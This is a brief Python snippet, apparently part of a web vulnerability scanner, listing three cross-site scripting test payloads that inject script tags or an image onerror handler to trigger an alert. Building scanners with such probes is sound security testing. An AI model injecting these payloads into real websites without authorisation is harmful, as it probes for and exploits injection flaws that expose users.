#payloads for scanner

XSS_PAYLOADS = [
    "<script>alert('XSS1')</script>",
    "'\"><script>alert('XSS2')</script>",
    "<img src=x onerror=alert('XSS3')>",
]